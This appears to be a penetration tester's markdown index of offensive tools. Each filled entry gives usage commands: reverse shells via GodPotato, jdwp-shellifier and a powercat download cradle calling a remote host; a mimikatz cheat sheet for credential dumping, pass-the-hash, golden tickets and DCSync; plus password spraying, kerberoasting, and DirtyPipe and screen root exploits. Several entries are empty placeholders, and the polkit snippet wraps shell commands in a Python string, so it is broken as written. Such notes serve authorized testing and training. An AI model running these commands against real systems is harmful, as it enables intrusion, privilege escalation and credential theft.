# Utils: GodPotato
## Description: SEImpersonate to PE as NT AUTHORITY\SYSTEM
## Path: /utils/windows/GodPotato
## Shortcut: windows_GodPotato
## Usage:
> Ref: https://github.com/BeichenDream/GodPotato
> Ref: https://stackoverflow.com/questions/1565434/how-do-i-find-the-installed-net-versions

```powershell
# check NET version
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

# run commands
GodPotato.exe -cmd "cmd /c whoami"

# reverse shell
GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

# Utils: PrintSpoofer
## Description: SeImpersonatePrivilege PE as NT AUTHORITY\SYSTEM (Win 10, 2016, 2019)
## Path: /utils/windows/PrintSpoofer
## Shortcut: windows_PrintSpoofer
## Usage:
```powershell
PrintSpoofer64.exe -i -c cmd
```
# Utils: Procmon
## Description: 
## Path: /utils/windows/Procmon
## Shortcut: windows_Procmon
## Usage:
<-- Declare the usage here -->

# Utils: CVE-2021-3156
## Description: Sudo RCE (version 1.8.9-1.8.23)
## Path: /utils/CVE/CVE-2021-3156
## Shortcut: CVE_sudo_PE
## Usage:
<-- Declare the usage here -->

# Utils: alpine-v3.13-x86_64-20210218_0139.tar.gz
## Description: lxd Group Privilege Escalation
## Path: /utils/linux/alpine-v3.13-x86_64-20210218_0139.tar.gz
## Shortcut: linux_lxd_group
## Usage:
<-- Declare the usage here -->

# Utils: windows-addUser
## Description: .exe to add user to PE as administrator (binary hijacking etc)
## Path: /utils/windows/windows-addUser
## Shortcut: windows_addUser
## Usage:
<-- Declare the usage here -->

# Utils: firefox_decrypt
## Description: Decrypt filefox credentials 
## Path: /utils/service/firefox_decrypt
## Shortcut: service_crypto_firefox_decrypt
## Usage:
<-- Declare the usage here -->

# Utils: pspy
## Description: Check all hidden process 
## Path: /utils/linux/pspy
## Shortcut: linux_pspy
## Usage:
```sh
./pspy
```

# Utils: dll-addUser.c
## Description: Payload for DLL to add user as administrator
## Path: windows/dll-addUser.c
## Shortcut: windows_dllAdduser
## Usage:
```sh
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

# Utils: accesschk
## Description: permission check 
## Path: /utils/windows/accesschk
## Shortcut: windows_accesschk
## Usage:
```powershell
.\accesschk64.exe -accepteula -wv (whoami) C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

# Utils: SharpHound-v2.4.1
## Description: BloodHound (bloodhound-ce)
## Path: /utils/windows/SharpHound-v2.4.1
## Shortcut: windows_sharphound_2_4_1
## Usage:
```sh
svc bloodhound-ce
```

# Utils: mimikatz
## Description: 
## Path: windows/windows-resources/mimikatz
## Shortcut: windows_mimikatz
## Usage:
```powershell
# ref: https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file

# one-liner format
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"  exit > mimikatz.txt

# commands
privilege::debug    # enable debug priv
log <logfile>       # log to <logfile>. e.g., log output.txt

sekurlsa::logonpasswords full   # display all available logon passwords. with full - more detailed
sekurlsa::tickets /export       # export all kerberos tickets
sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[ntlm_hash] /run:[command] # pass the hash

kerberos::list /export          # list and export kerberos tickets
kerberos::ptt [ticket_file]     # pass a kerberos ticket, e.g., "kerberos::ptt c:\\\\ticket.kirbi"

kerberos::golden /user:[username] /domain:[domain] /sid:[sid] /krbtgt:[krbtgt_hash] /ticket:[ticket_file] # Golden Ticket
# e.g., kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-... /krbtgt:123456... /ticket:golden.kirbi

crypto::certificates /export    # export certificates
crypto::keys /export            # export cryptographic keys
vault::cred                     # list credentials stored in Windows Vault.
token::elevate                  # elevate the current token privileges.
lsadump::sam                    # dump the SAM database for password hashes.
lsadump::secrets                # dump LSA secrets

lsadump::dcsync /user:[domain\\\\username] /domain:[domain] # erform a DC Sync attack and retrieve hashes.
# e.g., lsadump::dcsync /user:example\\\\krbtgt /domain:example.com

sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[ntlm_hash] # pass-the-hash attack using NTLM hash.
kiwi_cmd sekurlsa::pth /user:[username] /domain:[domain] /aes256:[aes256_hash] # pass-the-hash attack using AES256 hash.

kerberos::tgt                   # retrieve the TGT (Ticket Granting Ticket).
kerberos::purge                 # purge all Kerberos tickets.
```


# Utils: Spray-Passwords.ps1
## Description: Windows Spary Password (OSCP 22.2.1.) 
## Path: /utils/windows/Spray-Passwords.ps1
## Shortcut: windows_spary_password
## Usage: 
```powershell
# identify admin users and spray
.\Spary-Passwords.ps1 -Pass Password123 -Admin
```

# Utils: Rubeus.exe
## Description: Kerberoasting, AS-REP Roasting, and others
## Path: /utils/windows/Rubeus.exe
## Shortcut: windows_rubeus
## Usage:
```powershell
# AS-Rep Roasting
.\Rubeus.exe asreproast /nowrap

# Keroasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
# Utils: BloodHoundCollector-4.3.1
## Description: BloodHound 4.3.1 collector
## Path: windows/BloodHoundCollector-4.3.1
## Shortcut: windows_bloodhound_4_3_1
## Usage:
```powershell
.\SharpHound.exe -c All
```

# Utils: CVE-2022-0847-DirtyPipe-Exploits
## Description: DirtyPipe Exploits 
## Path: CVE/CVE-2022-0847-DirtyPipe-Exploits
## Shortcut: CVE_DirtyPipe
## Usage:
```bash
# Ref: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# Version
Linux kernel versions newer than 5.8 are affected.
So far the vulnerability has been patched in the following Linux kernel versions:
- 5.16.11
- 5.15.25
- 5.10.102

# Test
# Ref: https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker
./dpipe.sh

# Exploit
./exploit-1

```

# Utils: jdwp-shellifier
## Description: exploit jdwp
## Path: service/jdwp-shellifier
## Shortcut: service_jdwp_shellifier
## Usage:
```bash
python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "bash /tmp/reverse-shell.sh"

# you will need to trigger the actibity (by default, nc the port)
```
# Utils: screen-v4.5.0-priv-escalate
## Description: screen 4.5.0 exploit 
## Path: CVE/screen-v4.5.0-priv-escalate
## Shortcut: CVE_screen_4_5_0
## Usage:
```bash
# ref: https://github.com/YasserREED/screen-v4.5.0-priv-escalate/tree/main

# first drop the files
ship $CVE_screen_4_5_0/libhax.so $CVE_screen_4_5_0/rootshell

chmod +x libhax.so
chmod +x rootshell

# execution
cd /etc || exit 1
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```
# Utils: IOXIDResolver
## Description: find additional active interfaces (windows)
## Path: recon/IOXIDResolver
## Shortcut: recon_IOXIDResolver
## Usage:
```bash
python3 IOXIDResolver.py -t $target
```

# Utils: CVE-polkit
## Description: polkit exploit
## Path: CVE/CVE-polkit
## Shortcut: CVE_polkit
## Usage: 
```sh
# unzip
tar -xf 47167.zip

python3 -c "
import zipfile
with zipfile.ZipFile('47167.zip', 'r') as zip_ref:
    zip_ref.extractall('.')

chmod +x polkit/exploit.polkit.sh
# and exec
./exploit.polkit.sh
"
```

# Utils: Get-SPN.ps1
## Description: 
## Path: /utils/windows/Get-SPN.ps1
## Shortcut: windows_GETSPN
## Usage:
```powershell
import-module .\Get-SPN.ps1
.\Get-SPN.ps1
```
# Utils: Invoke-RunasCs.ps1
## Description: 
## Path: /utils/windows/Invoke-RunasCs.ps1
## Shortcut: windows_InvokeRunasCS
## Usage:
```
Invoke-RunasCs -Username username -Password password -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/powercat.ps1');powercat -c 192.168.1.1 -p 5555 -e cmd"
Invoke-RunasCs -Username username -Password password -Command "shell.exe"
```
# Utils: Invoke-Kerberoast.ps1
## Description: 
## Path: /utils/windows/Invoke-Kerberoast.ps1
## Shortcut: $windows_invoke_kerberoast
## Usage:
```powershell
import .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | fl
```
# Utils: Avalonia-ILSpy-7.2RC
## Description: NET Decomplier
## Path: Avalonia-ILSpy-7.2RC
## Shortcut: 
## Usage:
```bash
# ref: https://github.com/icsharpcode/AvaloniaILSpy/releases
./ILSpy # this will open the GUI.
```
